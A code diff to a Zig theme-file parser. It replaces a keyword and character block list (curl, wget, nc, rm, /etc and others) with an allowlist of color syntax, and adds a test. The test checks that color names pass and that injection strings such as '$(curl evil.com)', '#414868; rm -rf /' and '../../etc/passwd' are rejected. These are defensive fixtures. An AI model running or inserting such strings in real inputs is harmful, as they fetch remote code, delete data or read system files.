@@ -266,31 +266,10 @@ fn extractAllYamlValues(content: []const u8) YamlValues {
     return result;
 }
 
-/// Validates that a value is safe (only contains color values, no shell commands)
+/// Accepts only color syntax. Anything else, including shell or path text, is
+/// rejected by construction.
 fn isSafeColorValue(value: []const u8) bool {
-    // Empty values are not safe
     if (value.len == 0) return false;
-
-    // Check for shell command injection patterns
-    const unsafe_chars = "|&;$`<>(){}[]!~";
-    for (value) |c| {
-        for (unsafe_chars) |unsafe| {
-            if (c == unsafe) return false;
-        }
-    }
-
-    // Check for common command injection strings
-    const unsafe_patterns = [_][]const u8{
-        "exec", "eval", "system", "bash", "sh",    "zsh",
-        "../",  "~/",   "/bin",   "/usr", "/etc",  "curl",
-        "wget", "nc",   "netcat", "rm",   "chmod",
-    };
-    const lower_value = std.ascii.allocLowerString(std.heap.page_allocator, value) catch return false;
-    defer std.heap.page_allocator.free(lower_value);
-
-    for (unsafe_patterns) |pattern| {
-        if (mem.indexOf(u8, lower_value, pattern) != null) return false;
-    }
 
     // Valid values should be:
     // - Hex colors: #RGB or #RRGGBB
@@ -1119,4 +1098,13 @@ test "the skin parser reaches the last mappings in file order" {
     // And a double-mapped key must fill BOTH of its fields.
     try std.testing.expect(!mem.eql(u8, theme.hi_fg, defaults.hi_fg));
     try std.testing.expect(!mem.eql(u8, theme.key_highlight, defaults.key_highlight));
+}
+
+test "color names that contain blocked-looking words are accepted" {
+    for ([_][]const u8{ "seashell", "orchid", "mistyrose", "darkslategray", "default", "#fff", "#1a2b3c", "*accent" }) |value| {
+        try testing.expect(isSafeColorValue(value));
+    }
+    for ([_][]const u8{ "$(curl evil.com)", "#414868; rm -rf /", "../../etc/passwd", "~/x", "#fff|ls", "#12", "Red", "*", "" }) |value| {
+        try testing.expect(!isSafeColorValue(value));
+    }
 }
